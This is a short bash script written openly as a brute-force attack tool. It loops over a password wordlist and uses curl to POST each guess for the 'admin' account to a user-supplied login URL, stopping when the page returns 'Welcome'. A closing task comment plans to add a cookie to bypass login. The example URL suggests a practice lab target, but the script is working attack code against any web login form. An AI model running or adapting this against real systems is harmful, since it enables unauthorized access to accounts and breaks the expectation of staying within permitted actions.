#!/bin/bash

read -p "Enter the target URL (e.g., http://192.168.1.100/bruteforce.php): " TARGET_URL

echo "Starting brute-force attack..."

for pass in $(cat wordlist.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" "$TARGET_URL")
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done

echo "Brute-force attack completed."

# ===== TASKS =====
# Add cookie to bypass login functionality with -c flag